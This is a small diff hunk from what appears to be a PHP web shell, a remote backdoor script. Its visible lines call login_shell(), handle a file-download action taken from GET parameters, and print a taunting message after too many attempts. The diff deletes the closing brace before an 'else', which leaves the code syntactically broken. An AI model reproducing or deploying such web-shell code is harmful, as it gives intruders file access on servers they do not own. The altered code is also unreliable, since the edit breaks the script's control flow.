@@ -263,7 +263,6 @@ $user = $_POST['username'];
 if($pass > 50){
 die("<center><b><font color='#b0b000'>Maybe you are Drunk O.o...".$warn."</font></b></center>
     ");
-}
     else
         login_shell();
 if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
